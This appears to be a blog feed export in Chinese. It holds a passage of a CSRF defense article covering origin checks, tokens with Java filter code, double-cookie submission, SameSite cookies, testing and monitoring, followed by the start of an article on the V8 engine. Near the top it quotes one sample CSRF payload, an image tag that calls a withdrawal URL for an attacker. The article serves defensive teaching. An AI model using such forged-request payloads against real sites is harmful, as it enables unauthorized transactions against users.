class="line">![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker)</span><br></pre></td></tr></table></figure><p>那么这个请求发起的攻击将不携带Referer。</p><p>另外在以下情况下Referer没有或者不可信：</p><ol><li>IE6、7下使用window.location.href=url进行界面的跳转，会丢失Referer。</li><li>IE6、7下使用window.open，也会缺失Referer。</li><li>HTTPS页面跳转到HTTP页面，所有浏览器Referer都丢失。</li><li>点击Flash上到达另外一个网站的时候，Referer的情况就比较杂乱，不太可信。</li></ol><h4 id="无法确认来源域名情况"><a href="#无法确认来源域名情况" class="headerlink" title="无法确认来源域名情况"></a>无法确认来源域名情况</h4><p>当Origin和Referer头文件不存在时该怎么办？如果Origin和Referer都不存在，建议直接进行阻止，特别是如果您没有使用随机CSRF Token（参考下方）作为第二次检查。</p><h4 id="如何阻止外域请求"><a href="#如何阻止外域请求" class="headerlink" title="如何阻止外域请求"></a>如何阻止外域请求</h4><p>通过Header的验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。</p><p>我们已经知道了请求域名是否是来自不可信的域名，我们直接阻止掉这些的请求，就能防御CSRF攻击了吗？</p><p>且慢！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似CSRF攻击。所以在判断的时候需要过滤掉页面请求情况，通常Header符合以下情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html</span><br><span class="line">Method: GET</span><br></pre></td></tr></table></figure><p>但相应的，页面请求就暴露在了CSRF的攻击范围之中。如果你的网站中，在页面的GET请求中对当前用户做了什么操作的话，防范就失效了。</p><p>例如，下面的页面请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:&#x2F;&#x2F;example.com&#x2F;addComment?comment&#x3D;XXX&amp;dest&#x3D;orderId</span><br></pre></td></tr></table></figure><p>注：这种严格来说并不一定存在CSRF攻击的风险，但仍然有很多网站经常把主文档GET请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。</p><p>另外，前面说过，CSRF大多数情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。</p><p>综上所述：同源验证是一个相对简单的防范方法，能够防范绝大多数的CSRF攻击。但这并不是万无一失的，对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。</p><p>而CSRF攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF Token的防护策略分为三个步骤：</p><p><strong>1. 将CSRF Token输出到页面中</strong></p><p>首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p><strong>2. 页面提交的请求携带这个Token</strong></p><p>对于GET请求，Token将附在请求地址之后，这样URL 就变成 <a href="http://url/?csrftoken=tokenvalue%E3%80%82">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”hidden”</span> <span class="attr">name</span>=<span class="string">”csrftoken”</span> <span class="attr">value</span>=<span class="string">”tokenvalue”/</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，就把Token以参数的形式加入请求了。</p><p><strong>3. 服务器验证Token是否正确</strong></p><p>当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。</p><p>这种方法要比之前检查Referer或者Origin要安全一些，Token可以在产生并放于Session之中，然后在每次请求时把Token从Session中拿出，与请求中的Token进行比对，但这种方法的比较麻烦的在于如何把Token以参数的形式加入请求。</p><p>下面将以Java为例，介绍一些CSRF Token的服务端校验逻辑，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest req = (HttpServletRequest)request; </span><br><span class="line">HttpSession s = req.getSession(); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从 session 中得到 csrftoken 属性</span></span><br><span class="line">String sToken = (String)s.getAttribute(“csrftoken”); </span><br><span class="line"><span class="keyword">if</span>(sToken == <span class="keyword">null</span>)&#123; </span><br><span class="line">   <span class="comment">// 产生新的 token 放入 session 中</span></span><br><span class="line">   sToken = generateToken(); </span><br><span class="line">   s.setAttribute(“csrftoken”,sToken); </span><br><span class="line">   chain.doFilter(request, response); </span><br><span class="line">&#125; <span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="comment">// 从 HTTP 头中取得 csrftoken </span></span><br><span class="line">   String xhrToken = req.getHeader(“csrftoken”); </span><br><span class="line">   <span class="comment">// 从请求参数中取得 csrftoken </span></span><br><span class="line">   String pToken = req.getParameter(“csrftoken”); </span><br><span class="line">   <span class="keyword">if</span>(sToken != <span class="keyword">null</span> &amp;&amp; xhrToken != <span class="keyword">null</span> &amp;&amp; sToken.equals(xhrToken))&#123; </span><br><span class="line">       chain.doFilter(request, response); </span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sToken != <span class="keyword">null</span> &amp;&amp; pToken != <span class="keyword">null</span> &amp;&amp; sToken.equals(pToken))&#123; </span><br><span class="line">       chain.doFilter(request, response); </span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">       request.getRequestDispatcher(“error.jsp”).forward(request,response); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码源自<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">IBM developerworks CSRF</a></p><p>这个Token的值必须是随机生成的，这样它就不会被攻击者猜到，考虑利用Java应用程序的java.security.SecureRandom类来生成足够长的随机标记，替代生成算法包括使用256位BASE64编码哈希，选择这种生成算法的开发人员必须确保在散列数据中使用随机性和唯一性来生成随机标识。通常，开发人员只需为当前会话生成一次Token。在初始生成此Token之后，该值将存储在会话中，并用于每个后续请求，直到会话过期。当最终用户发出请求时，服务器端必须验证请求中Token的存在性和有效性，与会话中找到的Token相比较。如果在请求中找不到Token，或者提供的值与会话中的值不匹配，则应中止请求，应重置Token并将事件记录为正在进行的潜在CSRF攻击。</p><h4 id="分布式校验"><a href="#分布式校验" class="headerlink" title="分布式校验"></a>分布式校验</h4><p>在大型网站中，使用Session存储CSRF Token会带来很大的压力。访问单台服务器session是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的HTTP请求通常要经过像Ngnix之类的负载均衡器之后，再路由到具体的服务器上，由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。</p><p>由于使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题，目前很多网站采用Encrypted Token Pattern方式。这种方法的Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p><p>这种Token的值通常是使用UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。</p><p>在token解密成功之后，服务器可以访问解析值，Token中包含的UserID和时间戳将会被拿来被验证有效性，将UserID与当前登录的UserID进行比较，并将时间戳与当前时间进行比较。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。</p><p>但是此方法的实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。</p><blockquote><p>验证码和密码其实也可以起到CSRF Token的作用哦，而且更安全。</p><p>为什么很多银行等网站会要求已经登录的用户在转账时再次输入密码，现在是不是有一定道理了？</p></blockquote><h3 id="双重Cookie验证"><a href="#双重Cookie验证" class="headerlink" title="双重Cookie验证"></a>双重Cookie验证</h3><p>在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。</p><p>那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。</p><p>双重Cookie采用以下流程：</p><ul><li>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</li><li>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</li><li>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</li></ul><p>此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。</p><p>当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。</p><p>由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况：</p><ul><li>如果用户访问的网站为<code>www.a.com</code>，而后端的api域名为<code>api.a.com</code>。那么在<code>www.a.com</code>下，前端拿不到<code>api.a.com</code>的Cookie，也就无法完成双重Cookie认证。</li><li>于是这个认证Cookie必须被种在<code>a.com</code>下，这样每个子域都可以访问。</li><li>任何一个子域都可以修改<code>a.com</code>下的Cookie。</li><li>某个子域名存在漏洞被XSS攻击（例如<code>upload.a.com</code>）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了<code>a.com</code>下的Cookie。</li><li>攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向<code>www.a.com</code>下，发起CSRF攻击。</li></ul><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><strong>用双重Cookie防御CSRF的优点：</strong></p><ul><li>无需使用Session，适用面更广，易于实施。</li><li>Token储存于客户端中，不会给服务器带来压力。</li><li>相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。</li></ul><p><strong>缺点：</strong></p><ul><li>Cookie中增加了额外的字段。</li><li>如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。</li><li>难以做到子域名的隔离。</li><li>为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。</li></ul><h3 id="Samesite-Cookie属性"><a href="#Samesite-Cookie属性" class="headerlink" title="Samesite Cookie属性"></a>Samesite Cookie属性</h3><p>防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解：</p><h4 id="Samesite-Strict"><a href="#Samesite-Strict" class="headerlink" title="Samesite=Strict"></a>Samesite=Strict</h4><p>这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo=1; Samesite=Strict</span><br><span class="line">Set-Cookie: bar=2; Samesite=Lax</span><br><span class="line">Set-Cookie: baz=3</span><br></pre></td></tr></table></figure><p>我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。</p><h4 id="Samesite-Lax"><a href="#Samesite-Lax" class="headerlink" title="Samesite=Lax"></a>Samesite=Lax</h4><p>这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo=1; Samesite=Strict</span><br><span class="line">Set-Cookie: bar=2; Samesite=Lax</span><br><span class="line">Set-Cookie: baz=3</span><br></pre></td></tr></table></figure><p>当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。</p><p>生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addTokenCookieAndHeader</span><span class="params">(HttpServletRequest httpRequest, HttpServletResponse httpResponse)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//生成token</span></span><br><span class="line">       String sToken = <span class="keyword">this</span>.generateToken();</span><br><span class="line">       <span class="comment">//手动添加Cookie实现支持“Samesite=strict”</span></span><br><span class="line">       <span class="comment">//Cookie添加双重验证</span></span><br><span class="line">       String CookieSpec = String.format(<span class="string">&quot;%s=%s; Path=%s; HttpOnly; Samesite=Strict&quot;</span>, <span class="keyword">this</span>.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI());</span><br><span class="line">       httpResponse.addHeader(<span class="string">&quot;Set-Cookie&quot;</span>, CookieSpec);</span><br><span class="line">       httpResponse.setHeader(CSRF_TOKEN_NAME, token);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>代码源自<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Implementation_example">OWASP Cross-Site_Request_Forgery #Implementation example</a></p><h4 id="我们应该如何使用SamesiteCookie"><a href="#我们应该如何使用SamesiteCookie" class="headerlink" title="我们应该如何使用SamesiteCookie"></a>我们应该如何使用SamesiteCookie</h4><p>如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。</p><p>但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。</p><p>如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。</p><p>另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。</p><p>而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。</p><p>总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。</p><h2 id="防止网站被利用"><a href="#防止网站被利用" class="headerlink" title="防止网站被利用"></a>防止网站被利用</h2><p>前面所说的，都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF的攻击可以来自：</p><ul><li>攻击者自己的网站。</li><li>有文件上传漏洞的网站。</li><li>第三方论坛等用户内容。</li><li>被攻击网站自己的评论功能等。</li></ul><p>对于来自黑客自己的网站，我们无法防护。但对其他情况，那么如何防止自己的网站被利用成为攻击的源头呢？</p><ul><li>严格管理所有的上传接口，防止任何预期之外的上传内容（例如HTML）。</li><li>添加Header <code>X-Content-Type-Options: nosniff</code> 防止黑客上传HTML内容的资源（例如图片）被解析为网页。</li><li>对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接。</li><li>当前用户打开其他用户填写的链接时，需告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑）。</li></ul><h2 id="CSRF其他防范措施"><a href="#CSRF其他防范措施" class="headerlink" title="CSRF其他防范措施"></a>CSRF其他防范措施</h2><p>对于一线的程序员同学，我们可以通过各种防护策略来防御CSRF，对于QA、SRE、安全负责人等同学，我们可以做哪些事情来提升安全性呢？</p><h3 id="CSRF测试"><a href="#CSRF测试" class="headerlink" title="CSRF测试"></a>CSRF测试</h3><p>CSRFTester是一款CSRF漏洞的测试工具，CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 CSRFTester使用方法大致分下面几个步骤：</p><p><strong>步骤1：设置浏览器代理</strong></p><p>CSRFTester默认使用Localhost上的端口8008作为其代理，如果代理配置成功，CSRFTester将为您的浏览器生成的所有后续HTTP请求生成调试消息。</p><p><strong>步骤2：使用合法账户访问网站开始测试</strong></p><p>我们需要找到一个我们想要为CSRF测试的特定业务Web页面。找到此页面后，选择CSRFTester中的“开始录制”按钮并执行业务功能；完成后，点击CSRFTester中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。</p><p><strong>步骤3：通过CSRF修改并伪造请求</strong></p><p>之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有GET或者POST请求。通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改query和form的参数。当修改完所有我们希望诱导用户form最终的提交值，可以选择开始生成HTML报告。</p><p><strong>步骤4：拿到结果如有漏洞进行修复</strong></p><p>首先必须选择“报告类型”。报告类型决定了我们希望受害者浏览器如何提交先前记录的请求。目前有5种可能的报告：表单、iFrame、IMG、XHR和链接。一旦选择了报告类型，我们可以选择在浏览器中启动新生成的报告，最后根据报告的情况进行对应的排查和修复。</p><h3 id="CSRF监控"><a href="#CSRF监控" class="headerlink" title="CSRF监控"></a>CSRF监控</h3><p>对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了CSRF防护措施是很可能的。</p><p>一旦发生了CSRF攻击，我们如何及时的发现这些攻击呢？</p><p>CSRF攻击有着比较明显的特征：</p><ul><li>跨域请求。</li><li>GET类型请求Header的MIME类型大概率为图片，而实际返回Header的MIME类型为Text、JSON、HTML。</li></ul><p>我们可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有CSRF攻击嫌疑。我们可以提醒对应的页面和项目负责人，检查或者 Review其CSRF防护策略。</p><h2 id="个人用户CSRF安全的建议"><a href="#个人用户CSRF安全的建议" class="headerlink" title="个人用户CSRF安全的建议"></a>个人用户CSRF安全的建议</h2><p>经常上网的个人用户，可以采用以下方法来保护自己：</p><ul><li>使用网页版邮件的浏览邮件或者新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击。</li><li>尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器。</li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下上文的防护策略：</p><ul><li>CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。</li><li>CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。</li><li>保证页面的幂等性，后端接口不要在GET页面中做用户操作。</li></ul><p>为了更好的防御CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前Web应用程序自身的情况做合适的选择，才能更好的预防CSRF的发生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>认识 V8 引擎</title>
    <link href="http://aiolimp.com/2021/08/11/%E8%AE%A4%E8%AF%86V8%E5%BC%95%E6%93%8E/"/>
    <id>http://aiolimp.com/2021/08/11/%E8%AE%A4%E8%AF%86V8%E5%BC%95%E6%93%8E/</id>
    <published>2021-08-11T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.216Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认识-V8-引擎"><a href="#认识-V8-引擎" class="headerlink" title="认识 V8 引擎"></a>认识 V8 引擎</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JavaScript绝对是最火的编程语言之一，一直具有很大的用户群，随着在服务端的使用（NodeJs），更是爆发了极强的生命力。编程语言分为编译型语言和解释型语言两类，编译型语言在执行之前要先进行完全编译，而解释型语言一边编译一边执行，很明显解释型语言的执行速度是慢于编译型语言的，而JavaScript就是一种解释型脚本语言，支持动态类型、弱类型、基于原型的语言，内置支持类型。鉴于JavaScript都是在前端执行，而且需要及时响应用户，这就要求JavaScript可以快速的解析及执行。</p><p>随着Web相关技术的发展，JavaScript所要承担的工作也越来越多，早就超越了“表单验证”的范畴，这就更需要快速的解析和执行JavaScript脚本。V8引擎就是为解决这一问题而生，在node中也是采用该引擎来解析JavaScript。</p><p>V8是如何使得JavaScript性能有大幅提升的呢？通过对一些书籍和文章的学习，梳理了V8的相关内容，本文将带你认识 V8。(该文在 17 年初发布于公司内网，反响不错，近来闲暇再次整理作为知乎的第一篇分享，希望帮助更多的人了解 V8 引擎。<strong>转载需经过本人同意</strong>)</p><h2 id="1-渲染引擎及网页渲染"><a href="#1-渲染引擎及网页渲染" class="headerlink" title="1.渲染引擎及网页渲染"></a>1.渲染引擎及网页渲染</h2><p>浏览器自从上世纪80年代后期90年代初期诞生以来，已经得到了长足的发展，其功能也越来越丰富，包括网络、资源管理、网页浏览、多页面管理、插件和扩展、书签管理、历史记录管理、设置管理、下载管理、账户和同步、安全机制、隐私管理、外观主题、开发者工具等。在这些功能中，为用户提供网页浏览服务无疑是最重要的功能，下面将对相关内容进行介绍。</p><h2 id="1-1-渲染引擎"><a href="#1-1-渲染引擎" class="headerlink" title="1.1.渲染引擎"></a>1.1.渲染引擎</h2><p>渲染引擎：能够将HTML/CSS/JavaScript文本及相应的资源文件转换成图像结果。渲染引擎的主要作用是将资源文件转化为用户可见的结果。在浏览器的发展过程中，不同的厂商开发了不同的渲染引擎，如Tridend(IE)、Gecko(FF)、WebKit(Safari,Chrome,Andriod浏览器)等。WebKit是由苹果2005年发起的一个开源项目，引起了众多公司的重视，几年间被很多公司所采用，在移动端更占据了垄断地位。更有甚者，开发出了基于WebKit的支持HTML5的web操作系统(如：Chrome OS、Web OS)。</p><p>下面是WebKit的大致结构：</p><p><img src="https://pic1.zhimg.com/80/v2-959135939fe2cbc2d9a437ef81dff328_720w.png" alt="img"></p><p>上图中实线框内模块是所有移植的共有部分，虚线框内不同的厂商可以自己实现。下面进行介绍：</p><ul><li>操作系统：是管理和控制计算机硬件与软件资源的计算机程序，是直接运行在“裸机”上的最基本的系统软件，任何其他软件都必须在操作系统的支持下才能运行。WebKit也是在操作系统上工作的。</li><li>第三方库，为了WebKit提供支持，如图形库、网络库、视频库等。</li><li>WebCore 是各个浏览器使用的共享部分，包括HTML解析器、CSS解析器、DOM和SVG等。JavaScriptCore是WebKit的默认引擎，在谷歌系列产品中被替换为V8引擎。WebKit Ports是WebKit中的非共享部分，由于平台差异、第三方库和需求的不同等原因，不同的移植导致了WebKit不同版本行为不一致，它是不同浏览器性能和功能差异的关键部分。</li><li>WebKit嵌入式编程接口，供浏览器调用，与移植密切相关，不同的移植有不同的接口规范。</li><li>测试用例，包括布局测试用例和性能测试用例，用来验证渲染结果的正确性。</li></ul><h2 id="1-2-网页渲染流程"><a href="#1-2-网页渲染流程" class="headerlink" title="1.2.网页渲染流程"></a>1.2.网页渲染流程</h2><p>上面介绍了渲染引擎的各个模块，那么一张网页，要经历怎样的过程，才能抵达用户面前？</p><p><img src="https://pic4.zhimg.com/80/v2-ad0a86d3faf223164a9bd22658feadc3_720w.png" alt="img"></p><p>首先是网页内容，输入到HTML解析器，HTML解析器解析，然后构建DOM树，在这期间如果遇到JavaScript代码则交给JavaScript引擎处理；如果来自CSS解析器的样式信息，构建一个内部绘图模型。该模型由布局模块计算模型内部各个元素的位置和大小信息，最后由绘图模块完成从该模型到图像的绘制。在网页渲染的过程中，大致可分为下面3个阶段。</p><h2 id="1-2-1-从输入URL到生成DOM树"><a href="#1-2-1-从输入URL到生成DOM树" class="headerlink" title="1.2.1.从输入URL到生成DOM树"></a>1.2.1.从输入URL到生成DOM树</h2><ol><li>地址栏输入URL，WebKit调用资源加载器加载相应资源；</li><li>加载器依赖网络模块建立连接，发送请求并接收答复；</li><li>WebKit接收各种网页或者资源数据，其中某些资源可能同步或异步获取；</li><li>网页交给HTML解析器转变为词语；</li><li>解释器根据词语构建节点，形成DOM树；</li><li>如果节点是JavaScript代码，调用JavaScript引擎解释并执行；</li><li>JavaScript代码可能会修改DOM树结构；</li><li>如果节点依赖其他资源，如图片\css、视频等，调用资源加载器加载它们，但这些是异步加载的，不会阻碍当前DOM树继续创建；如果是JavaScript资源URL（没有标记异步方式），则需要停止当前DOM树创建，直到JavaScript加载并被JavaScript引擎执行后才继续DOM树的创建。</li></ol><h2 id="1-2-2-从DOM树到构建WebKit绘图上下文"><a href="#1-2-2-从DOM树到构建WebKit绘图上下文" class="headerlink" title="1.2.2.从DOM树到构建WebKit绘图上下文"></a>1.2.2.从DOM树到构建WebKit绘图上下文</h2><ol><li>CSS文件被CSS解释器解释成内部表示；</li><li>CSS解释器完成工作后，在DOM树上附加样式信息，生成RenderObject树；</li><li>RenderObject节点在创建的同时，WebKit会根据网页层次结构构建RenderLayer树，同时构建一个虚拟绘图上下文。</li></ol><h2 id="1-2-3-绘图上下文到最终图像呈现"><a href="#1-2-3-绘图上下文到最终图像呈现" class="headerlink" title="1.2.3.绘图上下文到最终图像呈现"></a>1.2.3.绘图上下文到最终图像呈现</h2><ol><li>绘图上下文是一个与平台无关的抽象类，它将每个绘图操作桥接到不同的具体实现类，也就是绘图具体实现类；</li><li>绘图实现类也可能有简单的实现，也可能有复杂的实现，软件渲染、硬件渲染、合成渲染等；</li><li>绘图实现类将2D图形库或者3D图形库绘制结果保存，交给浏览器界面进行展示。</li></ol><p>上述是一个完整的渲染过程，现代网页很多都是动态的，随着网页与用户的交互，浏览器需要不断的重复渲染过程。</p><h2 id="1-3-JavaScript引擎"><a href="#1-3-JavaScript引擎" class="headerlink" title="1.3.JavaScript引擎"></a>1.3.JavaScript引擎</h2><p><img src="https://pic1.zhimg.com/80/v2-0f5471e21a25e237dcfae2d34a306788_720w.png" 